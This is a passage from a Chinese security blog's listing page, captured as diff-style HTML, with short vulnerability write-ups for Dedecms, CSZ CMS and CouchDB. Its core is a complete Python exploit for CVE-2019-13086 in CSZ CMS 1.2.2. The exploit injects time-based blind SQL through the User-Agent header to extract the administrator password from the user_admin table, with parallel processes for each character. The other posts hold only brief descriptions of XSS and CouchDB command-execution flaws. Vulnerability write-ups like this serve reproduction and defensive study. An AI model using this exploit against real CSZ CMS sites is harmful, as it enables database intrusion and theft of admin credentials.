+<p>这个flash文件存在漏洞，此文件漏洞可参考:<a target="_blank" rel="noopener" href="https://nealpoole.com/blog/2012/05/xss-and-csrf-via-swf-applets-swfupload-plupload/">https://nealpoole.com/blog/2012/05/xss-and-csrf-via-swf-applets-swfupload-plupload/</a></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Dedecms/Dedecms%20swf%E6%96%87%E4%BB%B6%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Dedecms/Dedecms%20swf%E6%96%87%E4%BB%B6%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/" data-id="cl5c2qnpb004fy8v13un47553" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-CSZ CMS/（CVE-2019-13086）CSZ CMS 1.2.2 sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/CSZ%20CMS/%EF%BC%88CVE-2019-13086%EF%BC%89CSZ%20CMS%201.2.2%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:54.416Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-13086）CSZ-CMS-1-2-2-sql注入漏洞"><a href="#（CVE-2019-13086）CSZ-CMS-1-2-2-sql注入漏洞" class="headerlink" title="（CVE-2019-13086）CSZ CMS 1.2.2 sql注入漏洞"></a>（CVE-2019-13086）CSZ CMS 1.2.2 sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>CSZ CMS是一套基于PHP的开源内容管理系统（CMS）。 CSZ CMS<br>1.2.2版本（2019-06-20之前）中的core/MY_Security.php文件存在SQL注入漏洞。该漏洞源于基于数据库的应用缺少对外部输入SQL语句的验证。攻击者可利用该漏洞执行非法SQL命令。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>CSZ CMS 1.2.2版本（2019-06-20之前）</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>import requests
+import time
+import threading
+import multiprocessing
+
+pool=&quot;admin$ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;+&quot; &quot;+&quot;bcefghjklopqrstuvwxyz1234567890/.&quot;
+mutex=0
+
+#获取长度用的User-Agent模板
+ual=&quot;&#39;-(if((length((select name from user_admin limit 1))=10),sleep(5),1))-&#39;&#39;, &#39;127.0.0.1&#39;,&#39;time&#39;) #&quot;
+
+
+#&quot;Why don&#39;t you just build something&quot;
+#----------------------------------------------------获取管理员用户名长度--------------------------------------------
+def getlength(field,tbname,total):
+    ual_head=&quot;&#39;-(if((length((select &quot;     #这些空格一定要保留
+    ual_middle=&quot; limit 1))=&quot;
+    num=1
+    ual_last=&quot;),sleep(5),1))-&#39;&#39;, &#39;127.0.0.1&#39;,&#39;time&#39;) #&quot;
+
+    datas=&#123;&#39;email&#39;:&#39;111@111.com&#39;,
+        &#39;password&#39;:&#39;111&#39;
+    &#125;
+    
+    header=&#123;&#39;Host&#39;: &#39;localhost&#39;,
+            &#39;Content-Length&#39;: &#39;74&#39;,
+            &#39;Cache-Control&#39;: &#39;max-age=0&#39;,
+            &#39;Origin&#39;: &#39;http://localhost&#39;,
+            &#39;Upgrade-Insecure-Requests&#39;: &#39;1&#39;,
+            &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,
+            &#39;User-Agent&#39;: ual,
+            &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#39;,
+            &#39;Referer&#39;: &#39;http://localhost/cszcms/member/login&#39;,
+            &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,
+            &#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.9&#39;,
+            &#39;Connection&#39;: &#39;close&#39;&#125;
+
+    starttime=time.time()
+    for num in range(total):
+        header[&#39;User-Agent&#39;]=ual_head+field+&quot; from &quot;+tbname+ual_middle+str(num)+ual_last
+        #print(header[&#39;User-Agent&#39;])
+        sendtime=time.time()
+        response=requests.post(r&quot;http://localhost/cszcms/member/login/check/post&quot;,data=datas,headers=header)
+        recvtime=time.time()
+
+        doesitwork=recvtime-sendtime
+        if(doesitwork&gt;5):
+            print(&quot;The length is&quot;,num)
+            print(&quot;This step cost:&quot;,time.time()-starttime)
+            return num
+            break
+        if(num==total-1):
+            return 0
+
+#获取内容用的User-Agent模板
+ua=&quot;&#39;-(if((ascii(substr((select name from user_admin limit 1), 1, 1))=97),sleep(5),1))-&#39;&#39;, &#39;127.0.0.1&#39;,&#39;time&#39;) #&quot;
+        
+#-----------------------------------------------------获取管理员用户名--------------------------------------------
+def getcontent(field,tbname,num,qr,lock):
+
+    #print(num)
+    pool=&quot;@.tescomadin$ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;+&quot; &quot;+&quot;bcefghjklpqrstuvwxyz1234567890/.&quot;
+    
+    result=[]
+    
+    ua_head=&quot;&#39;-(if((ascii(substr((select &quot;
+    ua_front=&quot; limit 1), &quot;
+    ua_middle=&quot;, 1))=&quot;
+    char=&quot;A&quot;
+    ua_last=&quot;),sleep(5),1))-&#39;&#39;, &#39;127.0.0.1&#39;,&#39;time&#39;) #&quot;
+
+    datas=&#123;&#39;email&#39;:&#39;111@111.com&#39;,
+        &#39;password&#39;:&#39;111&#39;
+    &#125;
+    
+    header=&#123;&#39;Host&#39;: &#39;localhost&#39;,
+            &#39;Content-Length&#39;: &#39;74&#39;,
+            &#39;Cache-Control&#39;: &#39;max-age=0&#39;,
+            &#39;Origin&#39;: &#39;http://localhost&#39;,
+            &#39;Upgrade-Insecure-Requests&#39;: &#39;1&#39;,
+            &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,
+            &#39;User-Agent&#39;: ua,
+            &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#39;,
+            &#39;Referer&#39;: &#39;http://localhost/cszcms/member/login&#39;,
+            &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,
+            &#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.9&#39;,
+            &#39;Connection&#39;: &#39;close&#39;&#125;
+    
+    for i in range(1):
+        for char in pool:
+            header[&#39;User-Agent&#39;]=ua_head+field+&quot; from &quot;+tbname+ua_front+str(num+1)+ua_middle+str(ord(char))+ua_last
+            #print(header[&#39;User-Agent&#39;])
+            
+            lock.acquire()
+            sendtime=time.time()
+            response=requests.post(r&quot;http://localhost/cszcms/member/login/check/post&quot;,data=datas,headers=header)
+            lock.release()
+            
+            recvtime=time.time()
+
+            doesitwork=recvtime-sendtime
+            if(doesitwork&gt;5):
+                #print(&quot;It cost:&quot;,doesitwork)
+                print(num,&quot; got:&quot;,char)
+                #adminnamelist[num]=char    
+                result=[num,char]
+                qr.put(result)
+                break
+    
+#---------------------------------------------现在！让我们重新揭起救世的大旗！------------------------------------
+
+if __name__==&#39;__main__&#39;:
+
+    qr=multiprocessing.Queue()
+    lock=multiprocessing.Lock()
+    
+    field=&quot;password&quot;
+    tbname=&quot;user_admin&quot;
+
+    adminname=&quot;&quot;
+    adminpwd=&quot;&quot;
+
+    getresult=[]
+    
+    #调用获得长度的函数
+    length=getlength(field,tbname,100)  
+    print(&quot;length is&quot;,length)
+
+    processes=[]
+
+
+    #开线程分别对每个字符匹配
+    timehead=time.time()
+
+    for ti in range(length):
+        processes.append(multiprocessing.Process(target=getcontent,args=(field,tbname,ti,qr,lock)))
+        processes[ti].start()
+
+    for ti in range(length):
+        processes[ti].join()
+        
+    fout=open(field+&quot;out.txt&quot;,&quot;w+&quot;)
+    for ci in range(length):
+        getresult.append(qr.get())
+    print(getresult)
+    for ci in range(length):
+        for result in getresult:
+            if(result[0]==ci):
+                print(result[1])
+                adminname+=result[1]
+                
+    fout.write(adminname)
+    print(field,&quot;:&quot;,adminname)
+    fout.close()
+    print(&quot;It took:&quot;,time.time()-timehead)
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/CSZ%20CMS/%EF%BC%88CVE-2019-13086%EF%BC%89CSZ%20CMS%201.2.2%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/CSZ%20CMS/%EF%BC%88CVE-2019-13086%EF%BC%89CSZ%20CMS%201.2.2%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qnjs0046y8v13w260vgv" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-CSZ CMS/CSZ CMS 1.2.7 储存型xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/CSZ%20CMS/CSZ%20CMS%201.2.7%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" class="article-date">
+  <time datetime="2022-07-08T06:25:54.413Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="CSZ-CMS-1-2-7-储存型xss"><a href="#CSZ-CMS-1-2-7-储存型xss" class="headerlink" title="CSZ CMS 1.2.7 储存型xss"></a>CSZ CMS 1.2.7 储存型xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>拥有访问私有消息的未授权用户可以向管理面板嵌入Javascript代码。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>CSZ CMS 1.2.7</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>查看数据库中的email_logs可知，将访问的user-agent存储到了数据库中1.png</p>
+<p>我们首先观察路由，漏洞点在/member/insertpm页面，查看控制器，找到cszcms/controllers/Member.php</p>
+<p>2.png找到insertpm方法：</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/CSZ%20CMS/CSZ%20CMS%201.2.7%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/CSZ%20CMS/CSZ%20CMS%201.2.7%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" data-id="cl5c2qnjs0045y8v1fiol1dkv" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-CouchDB/（CVE-2017-12636）Couchdb 任意命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/CouchDB/%EF%BC%88CVE-2017-12636%EF%BC%89Couchdb%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:54.375Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2017-12636）Couchdb-任意命令执行漏洞"><a href="#（CVE-2017-12636）Couchdb-任意命令执行漏洞" class="headerlink" title="（CVE-2017-12636）Couchdb 任意命令执行漏洞"></a>（CVE-2017-12636）Couchdb 任意命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config<br>api修改couchdb的配置<code>query_server</code>，这个配置项在设计、执行view的时候将被运行。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>小于 1.7.0 以及 小于 2.1.1</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>Couchdb<br>2.x和和1.x的API接口有一定区别，所以这个漏洞的利用方式也不同。本环境启动的是1.6.0版本，如果你想测试2.1.0版本，可以启动<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635">CVE-2017-12635</a>附带的环境。</p>
+<p>执行如下命令启动Couchdb 1.6.0环境：</p>
+<pre><code>docker-compose up -d
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/CouchDB/%EF%BC%88CVE-2017-12636%EF%BC%89Couchdb%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/CouchDB/%EF%BC%88CVE-2017-12636%EF%BC%89Couchdb%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qnlc004by8v16wl8148g" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/85/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/84/">84</a><a class="page-number" href="/page/85/">85</a><span class="page-number current">86</span><a class="page-number" href="/page/87/">87</a><a class="page-number" href="/page/88/">88</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/87/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
